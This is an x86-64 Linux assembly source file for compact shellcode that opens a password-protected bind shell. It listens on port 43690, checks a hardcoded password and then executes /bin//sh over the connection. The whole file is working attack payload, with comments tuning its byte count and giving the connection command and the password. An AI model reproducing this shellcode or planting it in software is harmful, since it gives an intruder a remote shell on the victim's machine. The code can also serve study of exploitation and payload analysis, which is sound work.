bits 64
global _start

;
; /usr/include/x86_64-linux-gnu/asm/unistd_64.h 
;
; 88 bytes, 64 bit Ubuntu 12.04, No Password Auth
; With Password Auth: 127 bytes.
; Password: R2CBw0cr
;
; Connect to shell (nc host 43690), type password and press return
; Incorrect passwords will instantly drop the connection.
;

section .data

_start:
	;
	; Clean up registers.
	; (6 bytes)
	;
	xor rcx, rcx
	mul rcx

	;
	; socket(domain, type, protocol)
	;
	; (11 bytes)
	push byte 0x29
	push byte 0x02
	push byte 0x01
	pop rsi
	pop rdi
	pop rax

	syscall

	; sockfd in rax
	; bind( sockfd, *addr, addrlen )
	;
	; Swap our socket from RAX into RDI which is where
	; the next few functions want it anyway
	;
	; xchg is 1 byte shorter than mov
	;
	; (2 bytes)
	xchg rdi, rax			; socket in rdi for bind() rax is now 2

	;
	; bind( sockfd, *addr, addrlen )
	;
	; We need to set up our serv_addr (which we know is 0,port,2)
	; So load it all into RAX and push that. Note that because we want
	; 7 bytes but the register is 8, we pad 0xff onto the back and then
	; xor it to null to line everything up.
	;
	; Also note that this differs slightly from the BSD code, where we xor dl
	; instead of dh.
	;
	; (20 bytes)

	mov edx, 0xaaaaff02
	xor dh, 0xff
	push rdx
	mov rsi, rsp			; rsi points to our sockaddr *

	cdq				; reset RDX
	add al, 0x2f			; bind() is 0x31 but rax is already 0x02
	add dl, 0x10			; 16 (sizeof)
	syscall

	;
	; listen( sockfd, backlog )
	;
	; bind() returns 0 on success, so add al, RDI already points at our
	; sockfd, and we don't care what's in backlog but because it's a
	; stack pointer from a few lines back the number is sufficiently high
	; that it doesn't matter.
	;
	; (4 bytes)

	add al, 0x32
	syscall

	;
	; accept( sockfd, 0, 0 )
	;
	; accept() will return a new sockfd for us.
	;
	; (8 bytes)
	add al, 0x2b
	xor rsi, rsi
	cdq
	syscall

	;
	; read( socket, buffer, bytes )
	;
	; rax is syscall ( 0 = read )
	; rdi is socket
	; rsi is address to buffer (pointer)
	; rdx is number of bytes to read
	;
	; read will return number of bytes in rax
	; rsi will contain pointer to string
	; rdx will be null except for dl being 0x10
	;
	; 16 bytes
	;
	xchg rdi, rax

	mov rax, rdx		; rax is 0x00 for syscall
	push rdx		; null on the stack so we
				; have blank space for our
				; password read.
	lea rsi, [rsp-0x10]	; load the address of *buf
	add dl, 0x10		; number of bytes to read.
	syscall			; Do it.

	;
	; Password check.
	;
	; RSI has the pointer to our string, we're going to need
	; to save RDI as we will need the socket after the jump.
	; so all we have to do is load in the hex of our password
	; to RAX, save the socket, move the proper information
	; into RDI, and do a quick scasq.
	;
	; 20 bytes
	;
	mov rax, 0x7263307742433252	; Put your own password here.
	push rdi			; Save the client socket
	lea rdi, [rsi]			; Load the data into RDI
	scasq

	xchg rax, rdx			; RDX is 0x10, so this effectively empties
					; RAX except for AL. Either we use AL
					; for sys_exit, or we use it for dup2
					; so this saves us some bytes by not
					; doubling up on the code.

	jz dup2setup

	;
	; Exit.
	;
	; If the password was wrong, quit :)
	;
	; 4 bytes
	;
	add al, 0x2c		; 0x3C is exit. AL already holds 0x10.
	syscall

	;
	; Setup for dup2 loop
	;
	; 4 bytes
	; 
	dup2setup:
		pop rdi
		mov rsi, rdi

	;
	; dup2 loop
	;
	; (9 bytes)
	dup2:
		dec rsi
		mov al, 0x21
		syscall
		jnz dup2

	;
	; Now for the big one. Let's set up our execve()
	;
	; At this point RAX is 0 so just null out rdx
	;
	; We need rdx to be null for the 3rd argument to execve()
	;
	; (23 bytes)
	cdq

	add al, 0x3b		    ; execve()
	mov rbx, 0x68732f2f6e69622f     ; hs//nib/

	; Argument one shell[0] = "/bin//sh"
	push rdx			; null
	push rbx			; hs//nib/

	; We need pointers for execve()
	push rsp			; *pointer to shell[0]
	pop rdi	 ; Argument 1

	; Argument two shell (including address of each argument in array)
	push rdx			; null
	push rdi			; address of shell[0]

	; We need pointers for execve()
	push rsp			; address of char * shell
	pop rsi	 ; Argument 2

	syscall
